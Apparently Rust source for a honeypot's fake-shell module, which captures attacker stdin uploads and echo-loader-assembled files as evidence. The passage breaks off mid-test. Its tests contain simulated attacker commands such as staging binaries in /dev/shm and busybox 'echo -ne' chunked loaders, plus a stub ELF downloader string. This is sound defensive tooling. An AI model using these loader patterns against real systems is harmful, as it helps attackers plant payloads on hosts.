//! The input of a shell line that reads the session's own input, as it arrives, and the capture
//! of what such a line consumed.
//!
//! [`FakeShell::start_line`] decides whether a line reads its standard input. When it does, the
//! sensor holds the line and hands what arrives next to a [`HeldInput`] instead of the shell: the
//! rest of an SSH exec channel up to its EOF (a pipe), or what is typed at a terminal up to Ctrl-D.
//! [`HeldInput::finish`] then runs the line on those bytes and records them as evidence.
//!
//! A terminal is modeled as Linux's canonical line discipline does it: a line reaches the command
//! once Enter ends it, Backspace and Ctrl-U edit the line still being typed, Ctrl-D at the start of
//! a line is end of input (elsewhere it hands over the line so far), Ctrl-C kills the command, and
//! typed bytes are echoed with control characters shown as `^X`.
//!
//! Each byte a session sends goes to exactly one evidence path: input consumed by a held line is
//! captured here, and is never also offered to the shell (whose binary-flood capture sees only
//! what the shell itself was given as command lines).
//!
//! Captures are held per session in a [`StdinCaptures`] and submitted when its last handle is
//! dropped, which happens on every way a session ends, the listener's `max_duration` cancellation
//! included. Identical bodies (by SHA-256 of the bytes kept) are one capture whose `repeat_count`
//! says how many times the session sent it: a bot that retries an upload yields one sample, not
//! one per attempt.
//!
//! The same set takes the files the shell assembled from bytes the attacker typed (an echo
//! loader's `echo -ne '\xNN...' >> .i` chunks): at once when the file is made executable or run,
//! and, for one never run, when the session ends. A body is one sample per session whichever
//! path saw it first.
#![deny(
    clippy::arithmetic_side_effects,
    clippy::unwrap_used,
    clippy::indexing_slicing
)]

use std::net::IpAddr;
use std::sync::{Arc, Mutex, PoisonError};

use sensor_wire::{
    PROTO_TCP, SIGNAL_HONEYPOT_MALWARE_UPLOAD, SampleRef, SensorEvent, WIRE_VERSION,
};
use sha2::{Digest, Sha256};

use crate::capture_budget::CaptureBody;
use crate::fakefs::{FakeFs, READ_CAP};
use crate::handoff::{CaptureEnd, CaptureHandoff, CaptureJob, UploadEnd, upload_metadata};
use crate::sanitize::sanitize_value;
use crate::shell::{CommandResult, FakeShell, InputEnd};

/// `capture_reason` of input consumed by a command run over an SSH exec channel.
pub const CAPTURE_REASON_EXEC_STDIN: &str = "exec_stdin";

/// `capture_reason` of input typed (or pasted) at an interactive shell's terminal and consumed by
/// a command there.
pub const CAPTURE_REASON_SHELL_STDIN: &str = "shell_stdin";

/// `capture_reason` of a file the shell assembled from bytes the attacker typed as `echo` or
/// `printf` escapes, redirected into it chunk by chunk (see `FakeShell::with_captures`).
pub const CAPTURE_REASON_ECHO_LOADER: &str = "echo_loader";

/// Files one session tracks for the capture at its end. A loader drops one file, or a few.
const MAX_TRACKED_FILES: usize = 16;

/// A file assembled in fewer chunks than this, and never made executable or run, is not captured
/// when the session ends: one `echo x > f` is a write probe or a note, not an upload.
const MIN_UNRUN_CHUNKS: u32 = 2;

/// Distinct bodies one session holds for deduplication. A further distinct body is submitted at
/// once, on its own, so the bound costs deduplication and never a capture.
pub const MAX_HELD_CAPTURES: usize = 16;

/// The longest line the terminal model edits: Linux's canonical-mode buffer. Bytes typed past it
/// are dropped until the line ends, as the kernel drops them.
const MAX_CANON: usize = 4095;

/// The longest destination path recorded in a capture's metadata.
const MAX_DESTINATION_LEN: usize = 512;

/// How a held line's input arrives.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum InputMode {
    /// A pipe: every byte is input, and only the channel's EOF ends it.
    Pipe,
    /// A terminal in canonical mode: lines, editing, Ctrl-D and Ctrl-C, and echo.
    Terminal,
}

/// Why a held line's input ended.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum HeldEnd {
    /// End of input: the channel's EOF, or Ctrl-D at the start of a terminal line.
    Eof,
    /// Ctrl-C at the terminal.
    Interrupt,
    /// The input reached `max_captured_bytes` or the process-wide capture memory budget, and the
    /// sensor took no more of it. The command sees end of input after what was kept.
    Budget,
    /// The channel or session went away with the input still open, ended by this.
    Cut(CaptureEnd),
}

impl HeldEnd {
    fn upload_end(self) -> UploadEnd {
        match self {
            Self::Eof => UploadEnd::TransferComplete,
            Self::Interrupt => UploadEnd::TransferCut(CaptureEnd::PeerAborted),
            Self::Budget => UploadEnd::TransferCut(CaptureEnd::CaptureBudget),
            Self::Cut(end) => UploadEnd::TransferCut(end),
        }
    }

    fn input_end(self) -> InputEnd {
        match self {
            Self::Eof | Self::Budget => InputEnd::Eof,
            Self::Interrupt => InputEnd::Interrupt,
            Self::Cut(_) => InputEnd::Hangup,
        }
    }
}

/// What [`HeldInput::feed`] did with a chunk of session bytes.
#[derive(Debug, Default)]
pub struct Fed {
    /// How many bytes of the chunk the input took. The rest, after a terminal's Ctrl-D or Ctrl-C,
    /// belongs to the shell again.
    pub taken: usize,
    /// What a terminal echoes for the bytes taken. Always empty for a pipe.
    pub echo: Vec<u8>,
    /// Set once the input has ended; the caller then calls [`HeldInput::finish`].
    pub ended: Option<HeldEnd>,
    /// A terminal line reached the command (input made [`HeldInput::per_line`] stops right after
    /// it), so the caller may try [`HeldInput::resume`].
    pub line: bool,
}

/// The input of one held line, collected as it arrives and bounded by `max_captured_bytes` and
/// the process-wide capture memory budget.
pub struct HeldInput {
    mode: InputMode,
    /// The bytes the command can read: everything for a pipe, the finished lines of a terminal.
    body: CaptureBody,
    /// Input bytes the session sent toward the command, kept or not, for `wire_size`.
    wire: u64,
    max_bytes: u64,
    /// A terminal's line still being typed.
    line: Vec<u8>,
    /// The previous byte was a CR, so a following LF or NUL is the rest of the same Enter.
    prev_cr: bool,
    /// Stop after each line handed to the command, for the caller to try [`HeldInput::resume`].
    per_line: bool,
    command: String,
    reason: &'static str,
    captures: StdinCaptures,
    /// Recorded already, so `Drop` has nothing left to do.
    recorded: bool,
}

impl HeldInput {
    /// Input for the line `shell` holds (see [`FakeShell::start_line`]), recorded into
    /// `captures` with `reason` once it ends. At most `max_bytes` are kept.
    pub fn new(
        shell: &FakeShell,
        mode: InputMode,
        captures: &StdinCaptures,
        reason: &'static str,
        max_bytes: u64,
    ) -> Self {
        Self {
            mode,
            body: captures.new_body(),
            wire: 0,
            max_bytes,
            line: Vec::new(),
            prev_cr: false,
            per_line: false,
            command: shell.awaiting_command().unwrap_or_default().to_string(),
            reason,
            captures: captures.clone(),
            recorded: false,
        }
    }

    /// Bytes kept so far: what the command will read.
    pub fn len(&self) -> usize {
        self.body.len()
    }

    pub fn is_empty(&self) -> bool {
        self.body.is_empty()
    }

    /// The line that started this input ended with a CR, so an LF (or a telnet NUL) right after
    /// it is the rest of that Enter, not an empty first line of input.
    pub fn follow_cr(&mut self) {
        self.prev_cr = true;
    }

    /// Hand a terminal's input over line by line: [`HeldInput::feed`] stops after each Enter so
    /// the caller can [`HeldInput::resume`] the command on what it has, and the bytes after that
    /// Enter stay the caller's if the command is done. For an interactive shell's terminal, where
    /// what follows a finished `read` is the next command line.
    pub fn per_line(&mut self) {
        self.per_line = self.mode == InputMode::Terminal;
    }

    /// The last line handed over ended with a CR, so an LF right after it belongs to that Enter.
    pub fn ended_on_cr(&self) -> bool {
        self.prev_cr
    }

    /// Run the held line on the lines typed so far, the input still open. `Some` is its output
    /// when that was enough for it (`read x`, `head -n 1`); the input is then recorded as
    /// complete and this is done. `None` leaves it waiting for more.
    pub fn resume(&mut self, shell: &mut FakeShell) -> Option<CommandResult> {
        let result = shell.try_finish_line(self.body.as_slice())?;
        let destination = shell.input_destination().map(str::to_string);
        self.record(UploadEnd::TransferComplete, destination);
        Some(result)
    }

    /// Take `data` as input. Stops at the byte that ends the input (a terminal's Ctrl-D at the
    /// start of a line or Ctrl-C, or the capture ceiling), leaving the rest to the caller.
    pub fn feed(&mut self, data: &[u8]) -> Fed {
        match self.mode {
            InputMode::Pipe => {
                let skip = usize::from(
                    std::mem::take(&mut self.prev_cr) && matches!(data.first(), Some(b'\n' | 0)),
                );
                let rest = data.get(skip..).unwrap_or_default();
                let ended = (!self.release(rest)).then_some(HeldEnd::Budget);
                Fed {
                    taken: data.len(),
                    echo: Vec::new(),
                    ended,
                    line: false,
                }
            }
            InputMode::Terminal => self.feed_terminal(data),
        }
    }

    fn feed_terminal(&mut self, data: &[u8]) -> Fed {
        let mut fed = Fed::default();
        for &byte in data {
            fed.taken = fed.taken.saturating_add(1);
            if std::mem::take(&mut self.prev_cr) && matches!(byte, b'\n' | 0) {
                continue;
            }
            match byte {
                // Ctrl-D: end of input on an empty line; otherwise the line so far is handed
                // over without a newline and the next Ctrl-D ends the input.
                0x04 => {
                    if self.line.is_empty() {
                        fed.ended = Some(HeldEnd::Eof);
                        return fed;
                    }
                    let line = std::mem::take(&mut self.line);
                    if !self.release(&line) {
                        fed.ended = Some(HeldEnd::Budget);
                        return fed;
                    }
                }
                // Ctrl-C: the line being typed is lost, the command is killed.
                0x03 => {
                    self.line.clear();
                    fed.echo.extend_from_slice(b"^C");
                    fed.ended = Some(HeldEnd::Interrupt);
                    return fed;
                }
                b'\r' | b'\n' => {
                    self.prev_cr = byte == b'\r';
                    fed.echo.extend_from_slice(b"\r\n");
                    let mut line = std::mem::take(&mut self.line);
                    line.push(b'\n');
                    if !self.release(&line) {
                        fed.ended = Some(HeldEnd::Budget);
                        return fed;
                    }
                    if self.per_line {
                        fed.line = true;
                        return fed;
                    }
                }
                0x7f | 0x08 => {
                    if let Some(erased) = self.line.pop() {
                        fed.echo.extend_from_slice(rubout(erased));
                    }
                }
                // Ctrl-U: erase the whole line being typed.
                0x15 => {
                    for erased in std::mem::take(&mut self.line).into_iter().rev() {
                        fed.echo.extend_from_slice(rubout(erased));
                    }
                }
                _ if self.line.len() >= MAX_CANON => {}
                b'\t' => {
                    self.line.push(byte);
                    fed.echo.push(byte);
                }
                0..=0x1f => {
                    self.line.push(byte);
                    fed.echo.push(b'^');
                    fed.echo.push(byte | 0x40);
                }
                _ => {
                    self.line.push(byte);
                    fed.echo.push(byte);
                }
            }
        }
        fed
    }

    /// Keep `bytes` as input the command can read. False once the ceiling or the memory budget
    /// refused some of them: the input ends there.
    fn release(&mut self, bytes: &[u8]) -> bool {
        let arrived = u64::try_from(bytes.len()).unwrap_or(u64::MAX);
        self.wire = self.wire.saturating_add(arrived);
        let room = self
            .max_bytes
            .saturating_sub(u64::try_from(self.body.len()).unwrap_or(u64::MAX));
        let take = usize::try_from(room).unwrap_or(usize::MAX).min(bytes.len());
        let kept = self
            .body
            .extend_from_slice(bytes.get(..take).unwrap_or_default());
        kept.is_ok() && take == bytes.len()
    }

    /// Run the held line on the input it got and record that input as evidence. Returns what the
    /// line printed, for the caller to send.
    pub fn finish(mut self, shell: &mut FakeShell, end: HeldEnd) -> CommandResult {
        let result = shell.finish_line(self.body.as_slice(), end.input_end());
        let destination = shell.input_destination().map(str::to_string);
        self.record(end.upload_end(), destination);
        result
    }

    /// Record the input without running the line, when the session ends by `end` with it still
    /// open and the shell no longer matters.
    pub fn abandon(mut self, end: CaptureEnd) {
        self.record(UploadEnd::TransferCut(end), None);
    }

    fn record(&mut self, end: UploadEnd, destination: Option<String>) {
        if std::mem::replace(&mut self.recorded, true) {
            return;
        }
        let body = std::mem::replace(&mut self.body, CaptureBody::unbudgeted());
        self.captures.record(Consumed {
            body,
            wire_size: self.wire,
            end,
            reason: self.reason,
            command: std::mem::take(&mut self.command),
            destination: destination.map(|path| sanitize_value(&path, MAX_DESTINATION_LEN)),
            chunk_count: None,
        });
    }
}

/// The listener cancels a session's future at `max_duration`, and nothing after the session loop
/// runs then: input still arriving is recorded here as cut off by that.
impl Drop for HeldInput {
    fn drop(&mut self) {
        self.record(UploadEnd::TransferCut(CaptureEnd::Cancelled), None);
    }
}

/// What a terminal prints to erase `byte` from the screen: one column, or two for a control
/// character it showed as `^X`.
fn rubout(byte: u8) -> &'static [u8] {
    if byte < 0x20 && byte != b'\t' {
        b"\x08\x08  \x08\x08"
    } else {
        b"\x08 \x08"
    }
}

/// The connection facts every stdin capture of a session carries.
#[derive(Debug, Clone)]
pub struct CaptureSource {
    /// The sensor's name: the event's `sensor` and `metadata.protocol_label`.
    pub sensor: &'static str,
    pub source_ip: IpAddr,
    pub wan_ip: Option<IpAddr>,
    pub session_id: uuid::Uuid,
    pub authenticated: bool,
}

/// One input a held line consumed, on its way into a [`StdinCaptures`].
struct Consumed {
    body: CaptureBody,
    wire_size: u64,
    end: UploadEnd,
    reason: &'static str,
    command: String,
    destination: Option<String>,
    /// For an assembled file: how many writes built it.
    chunk_count: Option<u32>,
}

/// A file the shell assembled from bytes the attacker typed, handed over when it was made
/// executable or run (see [`StdinCaptures::record_assembled`]).
#[derive(Clone, Debug)]
pub(crate) struct AssembledFile {
    /// The file's path as the shell resolved it.
    pub path: String,
    pub bytes: Vec<u8>,
    pub chunk_count: u32,
    /// The line that wrote the last chunk, sanitized and capped like `metadata.command`.
    pub command: String,
}

/// A file assembled this session, as the session's end finds it: captured then unless it was
/// already, it was changed by something else since, or it is too small an assembly to be one.
#[derive(Clone, Debug)]
pub(crate) struct TrackedFile {
    pub path: String,
    /// The content the last chunk left, so a file overwritten since is not taken for it.
    pub sha256: [u8; 32],
    pub len: u64,
    pub chunk_count: u32,
    pub command: String,
}

/// One distinct body and how many times the session sent it.
struct Capture {
    sha256: [u8; 32],
    consumed: Consumed,
    repeats: u64,
}

/// The stdin captures of one session, deduplicated by content and submitted when the last handle
/// is dropped. Cheap to clone: every handle is the same set.
#[derive(Clone)]
pub struct StdinCaptures {
    set: Arc<Mutex<CaptureSet>>,
}

struct CaptureSet {
    handoff: Arc<CaptureHandoff>,
    source: CaptureSource,
    held: Vec<Capture>,
    /// Digests of every body recorded or submitted this session, so an assembled file is taken
    /// once however many times it is run or found.
    seen: Vec<[u8; 32]>,
    /// The session's filesystem and the files assembled in it, read when the session ends.
    files: Option<FakeFs>,
    tracked: Vec<TrackedFile>,
    /// How the session ended, as its sensor reported it; a session cancelled at `max_duration`
    /// reports nothing.
    session_end: CaptureEnd,
}

impl StdinCaptures {
    pub fn new(handoff: Arc<CaptureHandoff>, source: CaptureSource) -> Self {
        Self {
            set: Arc::new(Mutex::new(CaptureSet {
                handoff,
                source,
                held: Vec::new(),
                seen: Vec::new(),
                files: None,
                tracked: Vec::new(),
                session_end: CaptureEnd::Cancelled,
            })),
        }
    }

    /// Record how the session ended, for the files captured when it does. Sensors call this at
    /// their exit paths; a session the listener cancels never does, and stays `Cancelled`.
    pub fn end_session(&self, end: CaptureEnd) {
        self.lock().session_end = end;
    }

    /// Take an assembled file that was made executable or run. The assembly is finished as far as
    /// the attacker is concerned, so it is recorded as a complete transfer. A body already
    /// recorded this session, by this path or another, is not taken again.
    pub(crate) fn record_assembled(&self, file: AssembledFile) {
        let AssembledFile {
            path,
            bytes,
            chunk_count,
            command,
        } = file;
        let mut set = self.lock();
        set.take_file(
            &path,
            &bytes,
            chunk_count,
            command,
            UploadEnd::TransferComplete,
        );
    }

    /// The files assembled so far and the filesystem holding them, replacing what an earlier
    /// line reported. Read once, when the session ends.
    pub(crate) fn track_assembled(&self, fs: &FakeFs, files: Vec<TrackedFile>) {
        let mut set = self.lock();
        if set.files.is_none() {
            set.files = Some(fs.share());
        }
        for file in files {
            if let Some(known) = set.tracked.iter_mut().find(|t| t.path == file.path) {
                *known = file;
            } else if set.tracked.len() < MAX_TRACKED_FILES {
                set.tracked.push(file);
            }
        }
    }

    /// The assemblies the session's shells have reported so far, for a shell that starts a line
    /// to continue what another one began.
    pub(crate) fn tracked_assembled(&self) -> Vec<TrackedFile> {
        self.lock().tracked.clone()
    }

    fn lock(&self) -> std::sync::MutexGuard<'_, CaptureSet> {
        self.set.lock().unwrap_or_else(PoisonError::into_inner)
    }

    fn new_body(&self) -> CaptureBody {
        self.lock().handoff.new_capture_body()
    }

    /// Bodies held so far, and the times each was sent, for tests.
    pub fn held_counts(&self) -> Vec<(usize, u64)> {
        self.lock()
            .held
            .iter()
            .map(|capture| (capture.consumed.body.len(), capture.repeats))
            .collect()
    }

    fn record(&self, consumed: Consumed) {
        // An empty body has nothing to capture, unless the memory budget starved it, which the
        // hand-off counts as a refusal the operator must see.
        if consumed.body.is_empty() && !consumed.body.is_exhausted() {
            return;
        }
        let sha256: [u8; 32] = Sha256::digest(consumed.body.as_slice()).into();
        let mut set = self.lock();
        if let Some(known) = set.held.iter_mut().find(|capture| capture.sha256 == sha256) {
            known.repeats = known.repeats.saturating_add(1);
            // A later copy that arrived whole says the bytes are the whole upload.
            if consumed.end.is_complete() && !known.consumed.end.is_complete() {
                known.consumed.end = consumed.end;
                known.consumed.wire_size = consumed.wire_size;
            }
            return;
        }
        // The same bytes already went out as an assembled file: one sample, not two.
        if set.seen.contains(&sha256) {
            return;
        }
        set.seen.push(sha256);
        let capture = Capture {
            sha256,
            consumed,
            repeats: 1,
        };
        if set.held.len() < MAX_HELD_CAPTURES {
            set.held.push(capture);
        } else {
            set.submit(capture);
        }
    }
}

impl CaptureSet {
    /// Submit the assembled file `bytes` at `path` unless this session already recorded the same
    /// bytes. It goes at once rather than being held: a loader's file is final when it runs it,
    /// and the console should see the sample while the session is still going.
    fn take_file(
        &mut self,
        path: &str,
        bytes: &[u8],
        chunk_count: u32,
        command: String,
        end: UploadEnd,
    ) {
        if bytes.is_empty() {
            return;
        }
        let sha256: [u8; 32] = Sha256::digest(bytes).into();
        if self.seen.contains(&sha256) {
            return;
        }
        self.seen.push(sha256);
        let mut body = self.handoff.new_capture_body();
        // A refusal by the memory budget keeps the prefix that fit and marks the body exhausted,
        // which the hand-off reports; `wire_size` still says how large the file was.
        let _ = body.extend_from_slice(bytes);
        self.submit(Capture {
            sha256,
            consumed: Consumed {
                body,
                wire_size: u64::try_from(bytes.len()).unwrap_or(u64::MAX),
                end,
                reason: CAPTURE_REASON_ECHO_LOADER,
                command,
                destination: Some(sanitize_value(path, MAX_DESTINATION_LEN)),
                chunk_count: Some(chunk_count),
            },
            repeats: 1,
        });
    }

    /// The tracked files as the session leaves them, taken unless already recorded, changed
    /// since their last chunk, or assembled in too few chunks to be an upload.
    fn take_tracked_files(&mut self) {
        let Some(fs) = self.files.take() else {
            return;
        };
        let end = UploadEnd::Session(self.session_end);
        for file in std::mem::take(&mut self.tracked) {
            if file.chunk_count < MIN_UNRUN_CHUNKS {
                continue;
            }
            let Ok(bytes) = fs.read_all(&file.path, READ_CAP) else {
                continue;
            };
            let sha256: [u8; 32] = Sha256::digest(&bytes).into();
            if sha256 == file.sha256 {
                self.take_file(&file.path, &bytes, file.chunk_count, file.command, end);
            }
        }
    }

    fn submit(&self, capture: Capture) {
        let Capture {
            consumed, repeats, ..
        } = capture;
        let Consumed {
            body,
            wire_size,
            end,
            reason,
            command,
            destination,
            chunk_count,
        } = consumed;
        let source = self.source.clone();
        let orig_name = destination
            .as_deref()
            .and_then(|path| path.rsplit('/').next())
            .unwrap_or_default()
            .to_string();
        let _ = self.handoff.submit(CaptureJob {
            body,
            orig_name,
            event_builder: Box::new(move |sample: SampleRef| {
                let mut metadata = upload_metadata(source.sensor, &sample, wire_size, end);
                if let Some(object) = metadata.as_object_mut() {
                    object.insert("capture_reason".into(), serde_json::json!(reason));
                    object.insert("command".into(), serde_json::json!(command));
                    object.insert("destination".into(), serde_json::json!(destination));
                    object.insert("repeat_count".into(), serde_json::json!(repeats));
                    if let Some(chunks) = chunk_count {
                        object.insert("chunk_count".into(), serde_json::json!(chunks));
                    }
                }
                SensorEvent {
                    v: WIRE_VERSION,
                    source_ip: source.source_ip,
                    wan_ip: source.wan_ip,
                    sensor: source.sensor.to_string(),
                    signal_type: SIGNAL_HONEYPOT_MALWARE_UPLOAD.into(),
                    protocol: PROTO_TCP.into(),
                    authenticated: source.authenticated,
                    observed_at: chrono::Utc::now(),
                    metadata,
                    sample: Some(sample),
                    session_id: Some(source.session_id),
                    occurrence_id: None,
                }
            }),
        });
    }
}

/// Submitting from `Drop` is what makes the captures survive every way a session ends: the last
/// handle goes when the session's future is dropped, cancelled or not. `submit` never blocks.
impl Drop for CaptureSet {
    fn drop(&mut self) {
        self.take_tracked_files();
        for capture in std::mem::take(&mut self.held) {
            self.submit(capture);
        }
    }
}

#[cfg(test)]
#[allow(
    clippy::unwrap_used,
    clippy::indexing_slicing,
    clippy::arithmetic_side_effects
)]
mod tests {
    use super::*;
    use crate::capture_budget::CaptureMemoryBudget;
    use crate::emit::EventEmitter;
    use crate::fakefs::FakeFs;
    use crate::outbox::OutboxManifest;
    use crate::shell::{EmitContext, LineStep};
    use crate::spool::QuarantineSpool;

    fn ctx() -> EmitContext {
        EmitContext {
            source_ip: "203.0.113.7".parse().unwrap(),
            wan_ip: None,
            authenticated: true,
            protocol_label: "ssh".to_string(),
            session_id: None,
        }
    }

    fn source() -> CaptureSource {
        CaptureSource {
            sensor: "ssh",
            source_ip: "203.0.113.7".parse().unwrap(),
            wan_ip: None,
            session_id: uuid::Uuid::now_v7(),
            authenticated: true,
        }
    }

    /// A hand-off whose worker spools into a temporary directory and logs events to a file.
    fn handoff(dir: &std::path::Path) -> Arc<CaptureHandoff> {
        let spool_dir = dir.join("spool");
        std::fs::create_dir(&spool_dir).unwrap();
        let handoff = Arc::new(CaptureHandoff::new(
            QuarantineSpool::new(spool_dir, 10_000_000, 100_000_000),
            EventEmitter::new(dir.join("events.jsonl")),
            64,
            "test".to_string(),
            OutboxManifest::new(dir.join("outbox")),
            Arc::new(CaptureMemoryBudget::new(u64::MAX)),
        ));
        handoff.start_worker();
        handoff
    }

    fn events(dir: &std::path::Path) -> Vec<serde_json::Value> {
        std::fs::read_to_string(dir.join("events.jsonl"))
            .unwrap_or_default()
            .lines()
            .map(|line| serde_json::from_str(line).unwrap())
            .collect()
    }

    /// A terminal-mode input for a shell waiting on `cat`.
    fn terminal(max: u64) -> (FakeShell, HeldInput, StdinCaptures) {
        let dir = tempfile::tempdir().unwrap();
        let captures = StdinCaptures::new(handoff(dir.path()), source());
        std::mem::forget(dir);
        let mut shell = FakeShell::new(FakeFs::new(), ctx());
        assert!(matches!(
            shell.start_line("cat > f").0,
            LineStep::AwaitingInput
        ));
        let input = HeldInput::new(&shell, InputMode::Terminal, &captures, "shell_stdin", max);
        (shell, input, captures)
    }

    #[tokio::test]
    async fn a_terminal_hands_over_finished_lines_and_echoes_what_is_typed() {
        let (_shell, mut input, _captures) = terminal(1 << 20);
        let fed = input.feed(b"ab\x7fc\rde\r\n");
        assert_eq!(fed.taken, 9);
        assert_eq!(fed.echo, b"ab\x08 \x08c\r\nde\r\n");
        assert_eq!(fed.ended, None);
        assert_eq!(input.body.as_slice(), b"ac\nde\n");
        // Ctrl-U erases the line being typed; a control byte echoes as ^X and is kept.
        let fed = input.feed(b"xyz\x15\x01q\r");
        assert_eq!(fed.echo, b"xyz\x08 \x08\x08 \x08\x08 \x08^Aq\r\n");
        assert_eq!(input.body.as_slice(), b"ac\nde\n\x01q\n");
        // Ctrl-D mid-line hands over the line without a newline; on an empty line it is EOF, and
        // the bytes after it are the shell's again.
        let fed = input.feed(b"tail\x04\x04echo next");
        assert_eq!((fed.taken, fed.ended), (6, Some(HeldEnd::Eof)));
        assert_eq!(input.body.as_slice(), b"ac\nde\n\x01q\ntail");
    }

    /// Handed over line by line, the input stops after each Enter; a reader that has its line
    /// finishes there, the input is captured as complete, and what follows is the shell's.
    #[tokio::test]
    async fn per_line_input_stops_at_each_enter_and_a_finished_reader_leaves_the_rest() {
        let dir = tempfile::tempdir().unwrap();
        let handoff = handoff(dir.path());
        let captures = StdinCaptures::new(handoff.clone(), source());
        let mut shell = FakeShell::new(FakeFs::new(), ctx());
        assert!(matches!(
            shell.start_line("read x; echo got=$x").0,
            LineStep::AwaitingInput
        ));
        let mut input = HeldInput::new(
            &shell,
            InputMode::Terminal,
            &captures,
            "shell_stdin",
            1 << 20,
        );
        input.per_line();
        let fed = input.feed(b"hello\recho next\r");
        assert_eq!((fed.taken, fed.line, fed.ended), (6, true, None));
        assert_eq!(fed.echo, b"hello\r\n");
        assert!(input.ended_on_cr());
        let output = input.resume(&mut shell).expect("`read` has its line");
        assert_eq!(output.to_string(), "got=hello\n");
        assert!(!shell.is_awaiting_input());
        drop(input);
        drop(shell);
        drop(captures);
        handoff.drain(std::time::Duration::from_secs(5)).await;
        let events = events(dir.path());
        assert_eq!(events.len(), 1, "{events:?}");
        assert_eq!(events[0]["metadata"]["end_reason"], "transfer_complete");
        assert_eq!(events[0]["metadata"]["size"], 6);
        // Without `per_line` a terminal input takes every line it is given at once.
        let (_shell, mut whole, _captures) = terminal(1 << 20);
        let fed = whole.feed(b"a\rb\r");
        assert_eq!((fed.taken, fed.line), (4, false));
    }

    #[tokio::test]
    async fn ctrl_c_loses_the_line_being_typed_and_ends_the_input() {
        let (_shell, mut input, _captures) = terminal(1 << 20);
        let fed = input.feed(b"kept\rlost\x03after");
        assert_eq!((fed.taken, fed.ended), (10, Some(HeldEnd::Interrupt)));
        assert!(fed.echo.ends_with(b"lost^C"));
        assert_eq!(input.body.as_slice(), b"kept\n");
    }

    #[tokio::test]
    async fn the_ceiling_keeps_a_prefix_counts_the_rest_and_ends_the_input() {
        let dir = tempfile::tempdir().unwrap();
        let captures = StdinCaptures::new(handoff(dir.path()), source());
        let mut shell = FakeShell::exec(FakeFs::new(), ctx());
        assert!(matches!(
            shell.start_line("cat > /tmp/x").0,
            LineStep::AwaitingInput
        ));
        let mut input = HeldInput::new(&shell, InputMode::Pipe, &captures, "exec_stdin", 4);
        let fed = input.feed(b"0123456789");
        assert_eq!((fed.taken, fed.ended), (10, Some(HeldEnd::Budget)));
        assert!(fed.echo.is_empty());
        assert_eq!(input.body.as_slice(), b"0123");
        assert_eq!(input.wire, 10);
    }

    /// The same body three times is one sample with `repeat_count` 3; another body is its own; a
    /// text body is captured like a binary one; every one carries the command and destination.
    #[tokio::test]
    async fn identical_bodies_are_one_capture_with_a_repeat_count() {
        let dir = tempfile::tempdir().unwrap();
        let handoff = handoff(dir.path());
        let captures = StdinCaptures::new(handoff.clone(), source());
        let fs = FakeFs::new();
        let upload = |line: &str, body: &[u8], end: HeldEnd| {
            let mut shell = FakeShell::exec(fs.share(), ctx());
            assert!(matches!(shell.start_line(line).0, LineStep::AwaitingInput));
            let mut input =
                HeldInput::new(&shell, InputMode::Pipe, &captures, "exec_stdin", 1 << 20);
            assert_eq!(input.feed(body).ended, None);
            input.finish(&mut shell, end)
        };
        let elf = b"\x7fELF\x02\x01\x01\x00binary-body";
        // The first copy is cut off; a later whole copy makes the capture complete.
        upload(
            "cd /dev/shm && cat > astats",
            elf,
            HeldEnd::Cut(CaptureEnd::PeerClosed),
        );
        upload("cd /dev/shm && cat > astats", elf, HeldEnd::Eof);
        upload("cd /dev/shm && cat > astats", elf, HeldEnd::Eof);
        let script = b"#!/bin/sh\necho text-body\n";
        upload("cat > /dev/shm/w.sh", script, HeldEnd::Eof);
        assert_eq!(
            captures.held_counts(),
            vec![(elf.len(), 3), (script.len(), 1)]
        );
        drop(captures);
        handoff.drain(std::time::Duration::from_secs(5)).await;

        let events = events(dir.path());
        assert_eq!(events.len(), 2, "{events:?}");
        let binary = &events[0]["metadata"];
        assert_eq!(binary["repeat_count"], 3);
        assert_eq!(binary["capture_reason"], "exec_stdin");
        assert_eq!(binary["command"], "cd /dev/shm && cat > astats");
        assert_eq!(binary["destination"], "/dev/shm/astats");
        assert_eq!(binary["orig_name"], "astats");
        assert_eq!(binary["complete"], true);
        assert_eq!(binary["end_reason"], "transfer_complete");
        assert_eq!(binary["size"], elf.len());
        assert_eq!(binary["truncated"], false);
        let text = &events[1]["metadata"];
        assert_eq!(text["repeat_count"], 1);
        assert_eq!(text["destination"], "/dev/shm/w.sh");
        assert_eq!(events[1]["signal_type"], "honeypot_malware_upload");
    }

    /// Input still arriving when the session is cancelled is recorded by `Drop`, cut off.
    #[tokio::test]
    async fn input_dropped_mid_upload_is_captured_as_cancelled() {
        let dir = tempfile::tempdir().unwrap();
        let handoff = handoff(dir.path());
        let captures = StdinCaptures::new(handoff.clone(), source());
        let shell = {
            let mut shell = FakeShell::exec(FakeFs::new(), ctx());
            assert!(matches!(
                shell.start_line("cat > x").0,
                LineStep::AwaitingInput
            ));
            shell
        };
        let mut input = HeldInput::new(&shell, InputMode::Pipe, &captures, "exec_stdin", 1 << 20);
        input.feed(b"fragment");
        drop(input);
        drop(captures);
        handoff.drain(std::time::Duration::from_secs(5)).await;
        let events = events(dir.path());
        assert_eq!(events.len(), 1);
        assert_eq!(events[0]["metadata"]["end_reason"], "session_cancelled");
        assert_eq!(events[0]["metadata"]["complete"], false);
        assert_eq!(
            events[0]["metadata"]["destination"],
            serde_json::Value::Null
        );
    }

    /// A downloader as an echo loader sends it: ELF magic, bytes past 0x7f, a request line.
    const DOWNLOADER: &[u8] = b"\x7fELF\x02\x01\x01\0\xff\x80\x0a\0GET /s2.bin HTTP/1.1\r\n\0";

    fn loader_shell(captures: &StdinCaptures) -> FakeShell {
        let mut shell = FakeShell::new(FakeFs::new(), ctx()).with_captures(captures.clone());
        shell.handle_input("cd /tmp");
        shell
    }

    /// Upload `body` to `path` in 8-byte `echo -ne` chunks; returns how many.
    fn upload_chunks(shell: &mut FakeShell, path: &str, body: &[u8]) -> usize {
        for (index, chunk) in body.chunks(8).enumerate() {
            let op = if index == 0 { ">" } else { ">>" };
            let text: String = chunk.iter().map(|b| format!("\\x{b:02x}")).collect();
            shell.handle_input(format!("/bin/busybox echo -ne '{text}' {op} {path}"));
        }
        body.chunks(8).count()
    }

    /// Where `chmod` fails, the loader copies its bytes into a copy of `/bin/ls` and back. The
    /// file it then runs is still its assembly, found by content: captured once, as the chunks
    /// built it, with the stage-2 URL derived from the run's arguments.
    #[tokio::test]
    async fn the_loaders_copy_fallback_still_finds_its_assembly_and_derives_the_url() {
        let dir = tempfile::tempdir().unwrap();
        let handoff = handoff(dir.path());
        let captures = StdinCaptures::new(handoff.clone(), source());
